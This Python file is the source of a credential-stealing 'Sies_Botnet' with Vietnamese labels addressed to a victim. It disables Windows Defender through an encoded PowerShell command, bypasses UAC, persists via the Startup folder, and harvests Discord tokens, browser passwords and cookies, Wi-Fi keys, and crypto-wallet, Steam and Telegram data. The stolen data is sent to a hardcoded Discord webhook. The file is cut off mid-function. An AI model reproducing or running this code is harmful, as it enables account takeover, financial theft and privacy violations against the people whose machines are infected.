import sys
import psutil
from PIL import ImageGrab
import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
import wmi
from discord import Embed, File, SyncWebhook
import requests
import uuid
import ctypes
import time
import base64
from threading import Thread

while True:
    hook = "https://discord.com/api/webhooks/1059813273849049108/E8emDhbCfxkscuupCO3fUYhEbTEdc6J80ppNQ3iJTdm00MZ79R9AsEgXUKtv0_ogg4Vx"

    if hasattr(sys, 'frozen'):
        MEIPASS = sys._MEIPASS
    else:
        MEIPASS = os.path.dirname(__file__)

    DETECTED = False

    def getip():
        ip = "None"
        try:
            ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
        except:
            pass
        return ip

    requirements = [
        ["requests", "requests"],
        ["Crypto.Cipher", "pycryptodome"]
    ]
    for modl in requirements:
        try: __import__(modl[0])
        except:
            subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
            time.sleep(3)

    import requests
    from Crypto.Cipher import AES

    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    temp = os.getenv("TEMP")
    Threadlist = []


    class DATA_BLOB(Structure):
        _fields_ = [
            ('cbData', wintypes.DWORD),
            ('pbData', POINTER(c_char))
        ]

    def GetData(blob_out):
        cbData = int(blob_out.cbData)
        pbData = blob_out.pbData
        buffer = c_buffer(cbData)
        cdll.msvcrt.memcpy(buffer, pbData, cbData)
        windll.kernel32.LocalFree(pbData)
        return buffer.raw

    def CryptUnprotectData(encrypted_bytes, entropy=b''):
        buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
        buffer_entropy = c_buffer(entropy, len(entropy))
        blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
        blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
        blob_out = DATA_BLOB()

        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
            return GetData(blob_out)

    def DecryptValue(buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass

#func chayj cungf wins
    class utils:
        ERRORLOGS = list()

        @staticmethod
        def generate(num= 5, invisible= False) -> str:
            if not invisible:
                return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=num))
            else:
                return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= num))
    class system:
        STARTUPDIR = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp'

        @staticmethod
        def disableWD() -> None:
            cmd = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode() #This line was triggering windows defender to delete the file so I encoded it
            subprocess.run(cmd, shell= True, capture_output= True)
        @staticmethod
        def WDexclude(path= None) -> None:
            if path is None:
                path = system.getSelf()[0]
            subprocess.run(f"powershell -Command Add-MpPreference -ExclusionPath '{path}'", shell= True, capture_output= True)
        @staticmethod
        def isInStartup() -> bool:
            path = os.path.dirname(system.getSelf()[0])
            return os.path.basename(path).lower() == 'startup'
        @staticmethod
        def getSelf() -> tuple:
            if hasattr(sys, 'frozen'):
                return (sys.executable, True)
            else:
                return (__file__, False)
        
        @staticmethod
        def putInStartup() -> str:
            file, isExecutable = system.getSelf()
            if isExecutable:
                out = os.path.join(system.STARTUPDIR, '{}.scr'.format(utils.generate(invisible= True)))
            else:
                out = os.path.join(system.STARTUPDIR, '{}.py'.format(utils.generate()))
            shutil.copyfile(file, out)
            return out
        
        @staticmethod
        def isAdmin() -> bool:
            s = subprocess.run("net session", shell= True, capture_output= True).returncode
            return s == 0
        
        @staticmethod
        def unblockMOTW(path) -> None:
            if os.path.isfile(path):
                name = os.path.basename(path)
                dir = os.path.dirname(path)
                subprocess.run(f"powershell Unblock-File '.\{name}'", shell= True, capture_output= True, cwd= dir)
        
        @staticmethod
        def UACbypass():
            if not hasattr(sys, 'frozen'):
                return
            subprocess.run(f"reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"{os.path.abspath(sys.executable)}\" /f", shell= True, capture_output= True)
            subprocess.run(f"reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f", shell= True, capture_output= True)
            subprocess.run("fodhelper.exe", shell= True, capture_output= True)
            subprocess.run(f"reg.exe delete hkcu\\software\\classes\\ms-settings /f >nul 2>&1", shell= True, capture_output= True)
            os._exit(0)




    def LoadRequests(methode, url, data='', files='', headers=''):
        for i in range(8): # max trys
            try:
                if methode == 'POST':
                    if data != '':
                        r = requests.post(url, data=data)
                        if r.status_code == 200:
                            return r
                    elif files != '':
                        r = requests.post(url, files=files)
                        if r.status_code == 200 or r.status_code == 413:
                            return r
            except:
                pass

    def LoadUrlib(hook, data='', files='', headers=''):
        for i in range(8):
            try:
                if headers != '':
                    r = urlopen(Request(hook, data=data, headers=headers))
                    return r
                else:
                    r = urlopen(Request(hook, data=data))
                    return r
            except: 
                pass

    def globalInfo():
        ip = getip()
        hostname = os.getenv('COMPUTERNAME')
        username = os.getenv("USERNAME")
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
        # print(ipdatanojson)
        ipdata = loads(ipdatanojson)
        # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
        contry = ipdata["country_name"]
        contryCode = ipdata["country_code"].lower()
        sehir = ipdata["state"]
        
        globalinfo = f"```Tên PC Nạn Nhân : {username.upper()}\nĐịa Chỉ IP :{ip} ({contry})\nHostname : {hostname})```"
        return globalinfo


    def Trust(Cookies):
        # simple Trust Factor system
        global DETECTED
        data = str(Cookies)
        tim = re.findall(".google.com", data)
        # print(len(tim))
        if len(tim) < -1:
            DETECTED = True
            return DETECTED
        else:
            DETECTED = False
            return DETECTED
            
    def GetUHQFriends(token):
        badgeList =  [
            {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
            {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
            {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
            {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
            {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
            {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
            {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
            {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
            {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
            {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
        ]
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        try:
            friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
        except:
            return False

        uhqlist = ''
        for friend in friendlist:
            OwnedBadges = ''
            flags = friend['user']['public_flags']
            for badge in badgeList:
                if flags // badge["Value"] != 0 and friend['type'] == 1:
                    if not "House" in badge["Name"]:
                        OwnedBadges += badge["Emoji"]
                    flags = flags % badge["Value"]
            if OwnedBadges != '':
                uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
        return uhqlist

    def GetBilling(token):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        try:
            billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
        except:
            return False
        
        if billingjson == []: return "```None```"

        billing = ""
        for methode in billingjson:
            if methode["invalid"] == False:
                if methode["type"] == 1:
                    billing += ":credit_card:"
                elif methode["type"] == 2:
                    billing += ":parking: "

        return billing
    def system_data() -> tuple[str, str, bool]:
            def get_hwid() -> str:
                try:
                    hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
                                                stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
                except:
                    hwid = "None"

                return hwid

            cpu = wmi.WMI().Win32_Processor()[0].Name
            gpu = wmi.WMI().Win32_VideoController()[0].Name
            ram = round(float(wmi.WMI().Win32_OperatingSystem()[
                        0].TotalVisibleMemorySize) / 1048576, 0)
            hwid = get_hwid()

            return (
                f"```CPU: {cpu}\nGPU: {gpu}\nRAM: {ram}\nHWID: {hwid}```",
                False
            )
    def disk_data() -> tuple[str, str, bool]:
            disk = ("{:<9} "*4).format("Drive", "Free", "Total", "Use%") + "\n"
            for part in psutil.disk_partitions(all=False):
                if os.name == 'nt':
                    if 'cdrom' in part.opts or part.fstype == '':
                        continue
                usage = psutil.disk_usage(part.mountpoint)
                disk += ("{:<9} "*4).format(part.device, str(
                    usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%") + "\n"

            return (
                
                f"```{disk}```",
                False
            )

    def wifi_data() -> tuple[str, str, bool]:
            networks, out = [], ''
            try:
                wifi = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profiles'], shell=True,
                    stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                wifi = [i.split(":")[1][1:-1]
                        for i in wifi if "All User Profile" in i]

                for name in wifi:
                    try:
                        results = subprocess.check_output(
                            ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
                            stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                        results = [b.split(":")[1][1:-1]
                                for b in results if "Key Content" in b]
                    except subprocess.CalledProcessError:
                        networks.append((name, ''))
                        continue

                    try:
                        networks.append((name, results[0]))
                    except IndexError:
                        networks.append((name, ''))

            except subprocess.CalledProcessError:
                pass
            except UnicodeDecodeError:
                pass

            out += f'{"SSID":<20}| {"PASSWORD":<}\n'
            out += f'{"-"*20}|{"-"*29}\n'
            for name, password in networks:
                out += '{:<20}| {:<}\n'.format(name, password)

            return (
                
                f"```{out}```",
                False
            )

    def GetBadge(flags):
        if flags == 0: return ''

        OwnedBadges = ''
        badgeList =  [
            {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
            {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
            {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
            {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
            {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
            {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
            {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
            {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
            {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
            {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
        ]
        for badge in badgeList:
            if flags // badge["Value"] != 0:
                OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]

        return OwnedBadges

    def GetTokenInfo(token):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }

        userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
        username = userjson["username"]
        hashtag = userjson["discriminator"]
        email = userjson["email"]
        idd = userjson["id"]
        pfp = userjson["avatar"]
        flags = userjson["public_flags"]
        nitro = ""
        phone = ""

        if "premium_type" in userjson: 
            nitrot = userjson["premium_type"]
            if nitrot == 1:
                nitro = "<a:DE_BadgeNitro:865242433692762122>"
            elif nitrot == 2:
                nitro = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
        if "phone" in userjson: phone = f'{userjson["phone"]}'

        return username, hashtag, email, idd, pfp, flags, nitro, phone

    def checkToken(token):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        try:
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
            return True
        except:
            return False
    def upload2(name, path):
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }    
        if name == "sysin4":            
            data = {
            "content": f'{globalInfo()}\n**Ổ Chứa Dữ Liệu :**`{path}`',
            "embeds": [
                {
                "color": 0000000,
                "fields": [
                    {
                        "name": "->🦸🏻‍♂️ Thông Tin Nạn Nhân: ",
                        "value": f"```{globalInfo()}```",
                        "inline": True
                    },
                    {
                        "name": "<:CPU:1004131852208066701> Cấu Hình Nạn Nhân :",
                        "value": f"```{system_data()}```",
                        "inline": True
                    },
                    {
                        "name": ":floppy_disk: Ổ Đĩa Nạn Nhân:",
                        "value": f"```{disk_data()}```",
                        "inline": True
                    },
                    {
                        "name": ":signal_strength: Thông Tin WiFi Nạn Nhân ",
                        "value": f"```{wifi_data()}```",
                        "inline": True
                    },
                    
                    ],
                "author": {
                    "name": "Sies_Botnet✔️",
                    "icon_url": "https://media.discordapp.net/attachments/941689893023801407/1059839041022988328/4bd19887a8515111f696d169513cf169.jpg"
                    },
                "footer": {
                    "text": "Sies_Botnet✔️",
                    "icon_url": "https://media.discordapp.net/attachments/941689893023801407/1059839041022988328/4bd19887a8515111f696d169513cf169.jpg"
                    },    
                }
            ],
            "avatar_url": "https://media.discordapp.net/attachments/941689893023801407/1059839041022988328/4bd19887a8515111f696d169513cf169.jpg",
            "username": "Sies_Botnet✔️",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)  

    def uploadToken(token, path):
        global hook
        global tgmkx
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)

        if pfp == None: 
            pfp = "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
        else:
            pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

        billing = GetBilling(token)
        badge = GetBadge(flags)
        friends = GetUHQFriends(token)
        if friends == '': friends = "```Không Có Bạn Bè Thân Thiết```"
        if not billing:
            badge, phone, billing = "🔒", "🔒", "🔒"
        if nitro == '' and badge == '': nitro = "```None```"

        data = {
            "content": f'{globalInfo()}\n**Ổ Chứa Dữ Liệu :**`{path}`',
            "embeds": [
                {
                "color": 0000000,
                "fields": [
                    {
                        "name": "<a:hyperNOPPERS:828369518199308388> Token acc nạn nhân:",
                        "value": f"```{token}```",
                        "inline": True
                    },
                    {
                        "name": "<:mail:750393870507966486> Email Liên kết Trong Acc :",
                        "value": f"```{email}```",
                        "inline": True
                    },
                    {
                        "name": "<a:1689_Ringing_Phone:755219417075417088> Số Đt Liên Kết Trong Acc:",
                        "value": f"```{phone}```",
                        "inline": True
                    },
                    {
                        "name": "<:mc_earth:589630396476555264>  Địa Chỉ IP Nạn Nhân :",
                        "value": f"```{getip()}```",
                        "inline": True
                    },
                    {
                        "name": "<:woozyface:874220843528486923> Huy Hiệu Hiện Có :",
                        "value": f"{nitro}{badge}",
                        "inline": True
                    },
                    {
                        "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Các Phương Thức Thanh Toán Được Liên Kết :",
                        "value": f"{billing}",
                        "inline": True
                    },
                    {
                        "name": "<a:mavikirmizi:853238372591599617> Bạn Bè Thân Thiết :",
                        "value": f"{friends}",
                        "inline": False
                    }
                    ],
                "author": {
                    "name": f"{username}#{hashtag} ({idd})",
                    "icon_url": f"{pfp}"
                    },
                "footer": {
                    "text": "Sies_Botnet✔️",
                    "icon_url": "https://media.discordapp.net/attachments/941689893023801407/1059839041022988328/4bd19887a8515111f696d169513cf169.jpg"
                    },
                "thumbnail": {
                    "url": f"{pfp}"
                    }
                }
            ],
            "avatar_url": "https://media.discordapp.net/attachments/941689893023801407/1059839041022988328/4bd19887a8515111f696d169513cf169.jpg",
            "username": "Sies_Botnet✔️",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


    def Reformat(listt):
        e = re.findall("(\w+[a-z])",listt)
        while "https" in e: e.remove("https")
        while "com" in e: e.remove("com")
        while "net" in e: e.remove("net")
        return list(set(e))

    def upload(name, link):
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }

        if name == "sies-cookies":
            rb = ' | '.join(da for da in cookiWords)
            if len(rb) > 1000: 
                rrrrr = Reformat(str(cookiWords))
                rb = ' | '.join(da for da in rrrrr)
            data = {
                "content": f"{globalInfo()}",
                "embeds": [
                    {
                        "title": "<-------Sies_Noti | Đã lấy được Cookie của nạn nhân✅------->",
                        "description": f"<:apollondelirmis:1012370180845883493>: **Tất Cả Tài Khoản Gồm :**\n\n{rb}\n\n**Thông Tin :**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Đã Được Tìm Thấy!\n<a:CH_IconArrowRight:715585320178941993> • [Bấm Vào để tải về!]({link})",
                        "color": 000000,
                        "footer": {
                            "text": "This botnet coded by Shinn!",
                            "icon_url": "https://media.discordapp.net/attachments/941689893023801407/1059839041022988328/4bd19887a8515111f696d169513cf169.jpg"
                        }
                    }
                ],
                "username": "Sies_Botnet✔️",
                "avatar_url": "https://media.discordapp.net/attachments/941689893023801407/1059839041022988328/4bd19887a8515111f696d169513cf169.jpg",
                "attachments": []
                }
            LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
            return

        if name == "sies-password":
            ra = ' | '.join(da for da in paswWords)
            if len(ra) > 1000: 
                rrr = Reformat(str(paswWords))
                ra = ' | '.join(da for da in rrr)

            data = {
                "content": f"{globalInfo()}",
                "embeds": [
                    {
                        "title": "<-------Sies_Noti | Đã lấy được Password của nạn nhân✅------->",
                        "description": f"<:apollondelirmis:1012370180845883493>: **Tất Cả Tài Khoản Bao Gồm**:\n{ra}\n\n**Thông Tin :**\n<a:hira_kasaanahtari:886942856969875476> • **{PasswCount}** Passwords Được Tìm Thấy!\n<a:CH_IconArrowRight:715585320178941993> • [Bấm Vào để tải về!]({link})",
                        "color": 000000,
                        "footer": {
                            "text": "This botnet coded by Shinn!",
                            "icon_url": "https://media.discordapp.net/attachments/941689893023801407/1059839041022988328/4bd19887a8515111f696d169513cf169.jpg"
                        }
                    }
                ],
                "username": "Sies_Botnet✔️",
                "avatar_url": "https://media.discordapp.net/attachments/941689893023801407/1059839041022988328/4bd19887a8515111f696d169513cf169.jpg",
                "attachments": []
                }
            LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
            return

        if name == "zips":
            data = {
                "content": f"{globalInfo()}",
                "embeds": [
                    {
                    "color": 000000,
                    "fields": [
                        {
                        "name": "Ngoài ra còn một số file được tìm thấy :",
                        "value": link
                        }
                    ],
                    "author": {
                        "name": "<-------Sies_Noti | Đã lấy được một số file quan trọng của nạn nhân✅------->"
                    },
                    "footer": {
                        "text": "This botnet coded by Shinn!",
                        "icon_url": "https://media.discordapp.net/attachments/941689893023801407/1059839041022988328/4bd19887a8515111f696d169513cf169.jpg"
                    }
                    }
                ],
                "username": "Sies_Botnet✔️",
                "avatar_url": "https://media.discordapp.net/attachments/941689893023801407/1059839041022988328/4bd19887a8515111f696d169513cf169.jpg",
                "attachments": []
                }
            LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
            return




    # def upload(name, tk=''):
    #     headers = {
    #         "Content-Type": "application/json",
    #         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    #     }

    #     # r = requests.post(hook, files=files)
    #     LoadRequests("POST", hook, files=files)
        




    def writeforfile(data, name):
        path = os.getenv("TEMP") + f"\sies-{name}.txt"
        with open(path, mode='w', encoding='utf-8') as f:
            f.write(f"<-------Sies_Noti | Cảm Ơn Bạn Đã Sử Dụng Bot Của Shin Mọi Thắc Mắc Xin Liên Hệ Admin Shin#1387 !------->\n\n")
            for line in data:
                if line[0] != '':
                    f.write(f"{line}\n")

    Tokens = ''
    def getToken(path, arg):
        if not os.path.exists(path): return

        path += arg
        for file in os.listdir(path):
            if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                        for token in re.findall(regex, line):
                            global Tokens
                            if checkToken(token):
                                if not token in Tokens:
                                    # print(token)
                                    Tokens += token
                                    uploadToken(token, path)

    Passw = []
    def getPassw(path, arg):
        global Passw, PasswCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Login Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "sies-" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data: 
            if row[0] != '':
                for wa in keyword:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if not old in paswWords: paswWords.append(old)
                Passw.append(f"Link : {row[0]}    |    Tài Khoản : {row[1]} | Mật Khẩu: {DecryptValue(row[2], master_key)}\n")
                PasswCount += 1
        writeforfile(Passw, 'sies-password')

    Cookies = []    
    def getCookie(path, arg):
        global Cookies, CookiCount
        if not os.path.exists(path): return
        
        pathC = path + arg + "/Cookies"
        if os.stat(pathC).st_size == 0: return
        
        tempfold = temp + "sies-" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        
        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)

        pathKey = path + "/Local State"
        
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data: 
            if row[0] != '':
                for wa in keyword:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if not old in cookiWords: cookiWords.append(old)
                Cookies.append(f"{row[0]}	TRUE	|	FALSE	2597573456	{row[1]}	{DecryptValue(row[2], master_key)}\n")
                CookiCount += 1
        writeforfile(Cookies, 'sies-cookies')

    def GetDiscord(path, arg):
        if not os.path.exists(f"{path}/Local State"): return

        pathC = path + arg

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])
        # print(path, master_key)
        
        for file in os.listdir(pathC):
            # print(path, file)
            if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        global Tokens
                        tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                        if checkToken(tokenDecoded):
                            if not tokenDecoded in Tokens:
                                # print(token)
                                Tokens += tokenDecoded
                                # writeforfile(Tokens, 'tokens')
                                uploadToken(tokenDecoded, path)

    def GatherZips(paths1, paths2, paths3):
        thttht = []
        for patt in paths1:
            a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
            a.start()
            thttht.append(a)

        for patt in paths2:
            a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
            a.start()
            thttht.append(a)
        
        a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
        a.start()
        thttht.append(a)

        for thread in thttht: 
            thread.join()
        global WalletsZip, GamingZip, OtherZip
            # print(WalletsZip, GamingZip, OtherZip)

        wal, ga, ot = "",'',''
        if not len(WalletsZip) == 0:
            wal = ":coin:  •  Các Thông Tin Về Thẻ\n"
            for i in WalletsZip:
                wal += f"└─ [{i[0]}]({i[1]})\n"
        if not len(WalletsZip) == 0:
            ga = ":video_game:  •  Game:\n"
            for i in GamingZip:
                ga += f"└─ [{i[0]}]({i[1]})\n"
        if not len(OtherZip) == 0:
            ot = ":tickets:  •  Ứng Dụng:\n"
            for i in OtherZip:
                ot += f"└─ [{i[0]}]({i[1]})\n"          
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        
        data = {
            "content": globalInfo(),
            "embeds": [
                {
                "title": "<-------Sies_Noti | Đã lấy được một số tệp .zip quan trọng của nạn nhân✅------->",
                "description": f"{wal}\n{ga}\n{ot}",
                "color": 000000,
                "footer": {
                    "text": "This bot coded by shinn!",
                    "icon_url": "https://media.discordapp.net/attachments/941689893023801407/1059839041022988328/4bd19887a8515111f696d169513cf169.jpg"
                }
                }
            ],
            "username": "Sies_Botnet✔️",
            "avatar_url": "https://media.discordapp.net/attachments/941689893023801407/1059839041022988328/4bd19887a8515111f696d169513cf169.jpg",
            "attachments": []
        }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


    def ZipTelegram(path, arg, procc):
        global OtherZip
        pathC = path
        name = arg
        if not os.path.exists(pathC): return
        subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

        zf = ZipFile(f"{pathC}/{name}.zip", "w")
        for file in os.listdir(pathC):
            if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
                zf.write(pathC + "/" + file)
        zf.close()

        lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
        #lnik = "https://google.com"
        os.remove(f"{pathC}/{name}.zip")
        OtherZip.append([arg, lnik])

    def ZipThings(path, arg, procc):
        pathC = path
        name = arg
        global WalletsZip, GamingZip, OtherZip
        # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
        # os.system(f"taskkill /im {procc} /t /f")

        if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
            browser = path.split("\\")[4].split("/")[1].replace(' ', '')
            name = f"Metamask_{browser}"
            pathC = path + arg
        
        if not os.path.exists(pathC): return
        subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

        if "Wallet" in arg or "NationsGlory" in arg:
            browser = path.split("\\")[4].split("/")[1].replace(' ', '')
            name = f"{browser}"

        elif "Steam" in arg:
            if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
            f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
            data = f.readlines()
            # print(data)
            found = False
            for l in data:
                if 'RememberPassword"\t\t"1"' in l:
                    found = True
            if found == False: return
            name = arg


        zf = ZipFile(f"{pathC}/{name}.zip", "w")
        for file in os.listdir(pathC):
            if not ".zip" in file: zf.write(pathC + "/" + file)
        zf.close()

